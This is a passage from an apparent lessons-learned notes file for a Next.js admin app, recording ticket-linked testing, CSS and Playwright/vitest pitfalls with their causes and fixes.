answers it. Re-running is also self-checking: an unchanged screen re-renders BYTE-IDENTICAL under
this harness (22-trainer-website-seeded.png did), so `git status` after a re-shoot names exactly the
stale ones. Deterministic only for screens without `Date.now()`-relative fixtures - see the
relative-timestamp gotcha above for the ones that always differ.

## Mutation-check a new column end to end, not just `tsc` (ENG-746, 25 Aug 2026)
**Symptom/risk:** ENG-785 lost a column across five surfaces with a green typecheck. Adding
`website_url` traverses five independent hops - the edit page's select string, `TrainerDetailRow`,
`toTrainerFormSeed`, the form payload, and each route's write map - and a break in any one is silent:
the field arrives `undefined`, coalesces to null, and the next save NULLs a value nobody touched.
**Cause:** `tsc` cannot check a runtime PostgREST projection (the row is CAST, not parsed), and an
OPTIONAL field in the row/prop type removes the compiler's last hold on the remaining hops.
**Do this:** declare such a field REQUIRED (`string | null`, never `?`) in both the row type and the
component prop type, derive the select string from a `Record<keyof RowType, true>` map so a missing
column fails `tsc`, and then actually break each hop in turn and confirm a test goes red before
trusting the suite. All five hops here were confirmed to fail closed. Note a too-wide projection does
NOT 500 - PostgREST returns an error the caller swallows and the screen renders empty.

## A worktree needs its OWN `npm install` — the shared checkout has no `.bin` (ENG-749, 25 Aug 2026)
**Symptom:** `npm test` in a fresh worktree dies with `sh: vitest: command not found`.
**Cause:** the shared `stablepass-admin/node_modules` is not fully installed, so symlinking
`node_modules -> ../../../node_modules` resolves but yields no `node_modules/.bin`. The sibling
worktrees each carry a real install (~366 packages).
**Do this:** run `npm install` inside the worktree before anything else. Budget ~1 min; it is the
first thing to do after `git worktree add`, not something to discover at the gate.

## `e2e/mock-supabase.mjs` answered Storage with `200 {}`, so NO photo preview ever rendered (ENG-749)
**Symptom:** a screenshot of an uploaded photo shows an empty preview box. Easy to read as a CSS bug.
**Cause:** the file had no Storage routes at all, so `POST /storage/v1/object/sign/...` fell to the
catch-all `200 {}`; `signPhoto()` then found no `signedURL` and returned null, and the `<img>` got
`src={undefined}`. Any "the upload worked" screenshot was therefore proving nothing about the bytes.
**Fixed here:** an in-memory object store now serves uploads back. Two things to know if you touch it:
1. **Handle binary routes BEFORE the shared `drainBody`** — that helper does
   `Buffer.concat(chunks).toString("utf8")`, which corrupts image bytes. The Storage branch runs
   above it and does its own `drainBinary`.
2. supabase-js uploads from a browser as **multipart/form-data** (it appends `cacheControl`
   alongside the file), so the body must be split on the boundary and the LARGEST part taken.
   `signedUrl` is built client-side as `${storageUrl}${signedURL}`, so the mint must return a
   ROOT-RELATIVE `/object/sign/...` path, not an absolute URL.
DELETE is deliberately left to the old catch-all so the marketing-photo sweep path is unchanged.

## `expect(getByText("Photo added"))` after a file pick is trivially true on an EDIT page (ENG-749)
**Symptom:** ENG-766's `failed photo copy warning` spec passed its photo-attached assertion and then
failed on the NEXT click with "retrying click action".
**Cause:** the seeded trainer `t1` already has a `photo_url`, so the zone renders "Photo added" from
first paint. The assertion could never fail, and it masked the fact that ENG-749's crop overlay had
opened and was intercepting the submit click.
**Do this:** after a pick, assert on something that was NOT already true — the crop dialog appearing,
or the preview's `naturalWidth`/dimensions changing. `e2e/photo-crop.spec.ts` asserts the DECODED
size of the stored object (1600x800 for use-as-is vs 800x800 for a crop), which a rename-only
"crop" could not fake.

## A shared component inherits `text-align` from whichever screen mounts it (ENG-749)
**Symptom:** the same crop dialog rendered centred on HorseForm and left-aligned on TrainerForm.
**Cause:** HorseForm's `.upload-zone` sets `text-align: center`. `position: fixed` takes the dialog
out of the LAYOUT but not out of the inherited cascade, so the ambient value still applied.
**Do this:** a component mounted on more than one screen must state its own `text-align` and `color`
rather than inheriting them. Caught by the screenshots, not by any test — worth a glance at both
screens' evidence whenever a component is shared.

## A cross-repo parity guard must fail LOUD when it cannot see (ENG-769)
**Symptom:** a guard that reads a sibling repo's source and asserts admin matches it can pass on
ZERO assertions — the anchor moved, the regex found nothing, and the test still went green. Three
separate ways this happened while building one guard, none caught by the suite:
1. `git -C <dir>` resolves against the repository that CONTAINS `<dir>`, not `<dir>` itself. A
   `stablepass-mobile` folder nested inside another checkout had its refs read from the OUTER repo,
   so the guard asked admin's own history for a mobile file.
2. Blanking comments to spaces (to stop matching rules discussed in prose) destroyed the newlines,
   which fused lines together and broke every indentation-anchored block lookup.
3. `styles.labelPill` also matches `styles.labelPillText`; `styles.raceBadge` also matches
   `styles.raceBadgeGold`. The SIBLING token stays inside the block when the thing itself moves out,
   so a containment assertion stayed green through exactly the divergence it existed to catch.
**Do this:** (a) verify `rev-parse --show-toplevel` equals the directory before trusting refs;
(b) preserve newlines when blanking; (c) anchor identifiers with `(?![A-Za-z])` AND assert the
occurrence COUNT, since position alone only proves *a* copy is in the right place; (d) make every
"anchor not found" path THROW with a "the guard has gone blind" message. Then MUTATION-CHECK it:
change each side, confirm red, restore. All three defects above were found by mutation, not review
of the code, and the guard was fully green before each fix.

## The sibling mobile checkout is on `main`, which is NOT the round-6 contract (ENG-769)
**Symptom:** a parity test reading `../stablepass-mobile/src/components/post-card.tsx` from the
WORKING TREE mirrors whatever branch that shared checkout happens to sit on — currently `main`,
which is still Round 5 and has no reel label pill at all. The test verifies nothing about the rule
it was written for, silently.
**Do this:** read the contract from a REF, first-existing-wins and deterministic
(`origin/feature/round6-v1` then `origin/main`), never "first ref that makes it pass". Note the
line numbers a ticket cites are the giveaway: ENG-769 cited `post-card.tsx:348/648/862`, which
match round6-v1 exactly and are nowhere near `main`'s.

## `.previewCompact .postCard` out-specifies any single-class card modifier (ENG-769)
**Symptom:** `.postCardReel { padding-top: 0 }` had no effect in the sidebar rail — the reel card
kept a 14px white band — while the modal was correct. `compose-css.test.ts` was green because
`rule(".postCardReel")` proves the DECLARATION exists, not that it WINS.
**Cause:** `.previewCompact .postCard` is specificity (0,2,0); a single-class modifier is (0,1,0),
so the compact rule wins on the same element regardless of source order. `rule()` deliberately
ignores descendant selectors when checking for duplicates, so it is structurally blind to this.
**Do this:** any new `.postCard*` modifier needs a `.previewCompact` twin AND its own pin. And note
the rail is the surface the operator actually composes against — the modal is opt-in, so a
modal-only screenshot proves the less important half.

## `next dev` + Playwright on 127.0.0.1: NOTHING hydrates (every interactive e2e fails)
Symptom: an e2e click does nothing — `toHaveClass`/value assertions fail, the DOM is correct and
`page.goto` works, no `pageerror`, all `/_next/static/*` chunks return 200/304. Probing a node shows
**no `__reactFiber$…` keys**: React never attached. Console shows only a failed
`ws://127.0.0.1:3002/_next/webpack-hmr` handshake.
Cause: `playwright.config.ts` drives `npm run dev` on `http://127.0.0.1:3002`. Next 16 treats a dev
request whose origin isn't in `allowedDevOrigins` as cross-origin and blocks the dev resources,
including the HMR socket — whose failed handshake aborts the client bootstrap, so the page renders
(SSR) but never hydrates. Server-action forms still work (progressive enhancement), which is why
sign-in passes and hides the problem.
Do-this: `allowedDevOrigins: ["127.0.0.1"]` in `next.config.ts` (added ENG-243). Dev-only, no effect
on `next build`/`next start`. If interactive e2e mysteriously fails repo-wide, check this FIRST.
Note: `compose.spec.ts` and `horses.spec.ts` still fail after the fix — those are separate, genuinely
pre-existing bugs (`byline-select` doesn't auto-fill; `.horse-empty` never renders for `?q=__none__`).

## ESLint here bans BOTH setState-in-effect and ref access during render
`react-hooks/set-state-in-effect` rejects `useEffect(() => setX(...), [dep])`, and the compiler rules
also reject "Cannot access/update refs during render" — so the usual *derive-state-from-a-changed-prop*
escape hatch (a `previousValue` ref compared during render) is ALSO an error. Both bite when resetting
component state on a route change.
Do-this: reset by **remounting** — `<Inner key={pathname} {...props} />` (ENG-243's drawer). Effect
cleanup runs before the new instance mounts, so a body-scroll lock or listener is released correctly.

## No `@testing-library/jest-dom` — use plain DOM assertions
`toHaveAttribute` / `toBeVisible` / `toBeInTheDocument` do NOT exist in vitest here. Use
`el.getAttribute("aria-expanded")`, `el.className`, `el.hasAttribute("inert")`, `toBeTruthy()`,
`toBeNull()`. Component tests also need `// @vitest-environment jsdom` (config default is `node`).

## jsdom's `matchMedia` never fires a change event — stub it
A component reacting to a media query (the responsive drawer resets past the shell breakpoint) can't be
tested with `fireEvent(window, new Event("resize"))`. Stub `window.matchMedia` with a fake exposing a
`get matches()` getter plus add/removeEventListener that records listeners, then invoke them inside
`act()`. See `app/(dash)/AdminNav.test.tsx`.

## Don't measure a CSS-transitioned element right after toggling its class
The drawer slides 220ms. `toHaveClass(/open/)` passes instantly, so a `boundingBox()` or
`page.screenshot()` on the next line captures it mid-slide (x ≈ -232 of a 262px drawer) — the
screenshot showed no drawer at all. `toBeInViewport()` is also too weak: a fully off-screen panel whose
edge touches x=0 still "intersects".
Do-this: `await expect.poll(async () => (await el.boundingBox())!.x).toBeGreaterThanOrEqual(0)` and
screenshot with `animations: "disabled"`. Same trap for a backdrop that only changes `opacity` — assert
the computed opacity, not viewport intersection, or the assertion passes in both states.

## Running the e2e suite rewrites unrelated committed screenshots
`e2e/__screenshots__/*.png` are tracked, and a full `npm run e2e` regenerates ~11 of them (many are
stale baselines from earlier tickets). That churn buries a shell/CSS diff and makes a
"zero desktop regression" claim unreviewable.
Do-this: before committing, `git checkout -- e2e/__screenshots__/` and re-add only the PNGs your ticket
owns.

## The Playwright harness is NOT concurrency-safe across worktrees (ENG-248)
**Symptom:** a *pre-existing* trainers/horses/posts spec goes red for no reason, or `EADDRINUSE`
on 8787, while another loop worker is running its own suite in a sibling worktree.
**Cause:** every worktree hardcodes the same two ports — 3002 (`playwright.config.ts` webServer) and
8787 (`e2e/mock-supabase.mjs`) — and `/__control` is shared **global mutable state**, so two
concurrent runs flip each other's `setEmpty()` dataset mid-test.
**Do this:** serialize `npm run e2e` across stablepass-admin worktrees, exactly like the
one-worker-at-a-time rule for stablepass-be. Check `lsof -nP -iTCP:3002 -sTCP:LISTEN` (and 8787)
before starting, and re-run before believing a red in a spec your diff does not touch.

## `position: sticky; bottom: 0` does NOT work inside `.admin-content` (ENG-248)
`app/globals.css` gives `.admin-content` `overflow-x: auto` at the shell breakpoint (<=899px). A
non-`visible` value on one axis forces the other to compute to `auto`, so `.admin-content` becomes a
dual-axis **scrollport** whose height is content-driven and therefore never scrolls vertically — a
sticky bottom child resolves against it and never engages while the document scrolls. Use
`position: fixed` for a mobile bottom action bar and reserve its height with a `padding-bottom` on
the screen wrapper. No ancestor forms a fixed containing block (the only `transform` in globals.css
is on `.admin-drawer`, a sibling), and the z-index lanes are bar 40 < backdrop 90 < drawer 100.

## A `documentElement`-only no-h-scroll check is not a gate (ENG-248)
Two blind spots, both real in this app: (1) `.admin-content`'s `overflow-x: auto` swallows an
over-wide child, so the document stays innocent while the screen is visibly broken; (2) a
`position: fixed` element contributes to **no** scrollable-overflow region at all, so overflow inside
a fixed bottom bar reads as `{doc:0, well:0}`. Measure `documentElement`, `.admin-content`,
`.admin-topbar` **and** any fixed bar — see `overflow()` in `e2e/trainers.spec.ts`.

## Screen-scoped CSS files share class names — scope new media queries to the screen (ENG-248)
`trainers.css`, `horses.css`, `posts.css` each define `.adm-card` / `.adm-table` / `.pill` etc., and
an App-Router imported stylesheet is **global once its chunk loads** (verified: after a client-side
nav from `/trainers` to `/posts`, the trainers media blocks are still in `document.styleSheets`). So
an unscoped `@media (max-width: 719px) .adm-table {…}` in one screen's file silently restyles the
others. Put a screen class (`trainers-screen`) on that screen's `.admin-topbar` + `.admin-content`
wrappers and scope every new rule under it — the `(dash)` layout is R1's file, so there is no shared
ancestor inside a screen ticket's surface to hang it on.
